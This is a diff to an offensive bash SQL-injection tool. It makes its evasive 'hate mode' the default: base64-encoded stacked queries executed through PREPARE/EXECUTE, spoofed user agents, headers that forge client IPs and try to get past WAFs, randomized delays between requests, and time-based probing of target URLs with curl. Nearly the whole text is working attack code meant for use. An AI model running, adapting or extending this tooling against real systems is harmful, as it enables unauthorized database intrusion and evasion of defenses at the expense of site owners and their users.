@@ -67,7 +67,7 @@ braindamage() {
         esac
     else
         case "$choice" in
-            0) echo "-H Content-Type:application/json -H Authorization:Bearer$cf_ray -H X-WAF-Bypass:True -H CF-IPCountry:US" ;;
+            0) echo "-H Content-Type:application/json -H Authorization:Bearer $cf_ray -H X-WAF-Bypass:True -H CF-IPCountry:US" ;;
 1) echo "-H Content-Type:application/json -H X-Requested-With:XMLHttpRequest -H CF-RAY:${cf_ray}-CGK -H True-Client-IP:103.21.244.$((RANDOM % 254 + 1))" ;;
 2) echo "-H Content-Type:application/json -H Cache-Control:no-cache,no-store -H Pragma:no-cache -H X-Forwarded-For:127.0.0.1" ;;
         esac
@@ -189,45 +189,34 @@ vector_sqli_agressor_right() {
 
         local base_ua="${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}"
         local random_ua="$base_ua"
-        if [ "$HATE_MODE" = "true" ]; then
-            local ua_salt=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
-            random_ua="${base_ua} Chrome/$((RANDOM % 10 + 120)).0.$((RANDOM % 999 + 1000)).$((RANDOM % 99)) Safari/537.36 Build/${ua_salt}"
-        fi
+        local ua_salt=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
+        
+        random_ua="${base_ua} Chrome/$((RANDOM % 10 + 120)).0.$((RANDOM % 999 + 1000)).$((RANDOM % 99)) Safari/537.36 Build/${ua_salt}"
 
         local defiance_tamper_path=""
         local final_query=""
+        local b64_payload=$(base64_engine "$query_payload")
+        
+        defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_payload}'); PREPARE stmt FROM @s; EXECUTE stmt;--"
+        final_query="${default_path}${defiance_tamper_path}"
 
-        if [ "$HATE_MODE" = "true" ]; then
-            local b64_payload=$(base64_engine "$query_payload")
-            defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_payload}'); PREPARE stmt FROM @s; EXECUTE stmt;--"
-            final_query="${default_path}${defiance_tamper_path}"
+        if [[ "$WORDLIST_MYSQL" == *"nonphp"* || "$WORDLIST_MYSQL" == *"HAHA"* ]]; then
+            final_query="${defiance_tamper_path}${query_payload}"
         else
-            local t1=$(between_engine "$default_path")
-            local t2=$(charencode_engine "$t1")
-            local t3=$(apostrophenullencode_engine "$t2")
-            local t4=$(randomcase_engine "$t3")
-            local t5=$(space2comment_engine "$t4")
-            local t6=$(appendnullbyte_engine "$t5")
-            local t7=$(xor_engine "$t6")
-            defiance_tamper_path=$(weirdcomment_engine "$t7")
-
-            if [[ "$WORDLIST_MYSQL" == *"nonphp"* ]]; then
-                final_query="${defiance_tamper_path}${query_payload}"
+            if [[ "$defiance_tamper_path" == *"="* ]]; then
+                local param_name=$(echo "$defiance_tamper_path" | cut -d'=' -f1)
+                local param_val=$(echo "$defiance_tamper_path" | cut -d'=' -f2-)
+                final_query="${param_name}=999&${param_name}=${param_val}${query_payload}"
             else
-                if [[ "$defiance_tamper_path" == *"="* ]]; then
-                    local param_name=$(echo "$defiance_tamper_path" | cut -d'=' -f1)
-                    local param_val=$(echo "$defiance_tamper_path" | cut -d'=' -f2-)
-                    final_query="${param_name}=999&${param_name}=${param_val}${query_payload}"
-                else
-                    final_query="${defiance_tamper_path}${query_payload}"
-                fi
+                final_query="${defiance_tamper_path}${query_payload}"
             fi
         fi
-
         local waf_trick=$(braindamage)
-        echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Vector 2 [Port:$random_port] Probing Latency on: \e[38;5;236m$target_url$final_query\e[0m"
+        
+        echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Vector 2 [Port:$random_port] Probing Latency on: \e[38;5;236m${target_url}${final_query}\e[0m"
 
-        local curl_output=$(curl $proxy_flag $waf_trick -m 12 -A "$random_ua" -s -o /dev/null -w "%{time_total}|%{http_code}" "$target_url$final_query")
+        local curl_output=$(curl $proxy_flag $waf_trick -m 12 -A "$random_ua" -s -o /dev/null -w "%{time_total}|%{http_code}" "${target_url}${final_query}")
+
         local stopwatch=$(echo "$curl_output" | cut -d'|' -f1)
         local http_status=$(echo "$curl_output" | cut -d'|' -f2)
 
@@ -243,12 +232,8 @@ vector_sqli_agressor_right() {
                 echo "SQLI_ALERT|$default_path|$query_payload" >> "$ROOT_LOG_FILE"
             fi
         fi
-
-        if [ "$HATE_MODE" = "true" ]; then
-            sleep $((RANDOM % 6 + 4))
-        else
-            sleep 5
-        fi
+        
+        sleep $((RANDOM % 6 + 4))
     done < <(shuf "$WORDLIST_MYSQL")
 }
              
@@ -331,8 +316,6 @@ if [ -n "$custom_wordlist" ] && [ -f "$custom_wordlist" ]; then
 
 export WORDLIST_MYSQL="$custom_wordlist"
 else
-if [ "$HATE_MODE" = "true" ]; then
-        echo -e "[i] Hate SubMode Active."
         if [[ "$target_url" != *"?"* ]]; then
             export WORDLIST_MYSQL="$DEFIANCE_DIR/../data/HAHAnonphp.txt"
         else
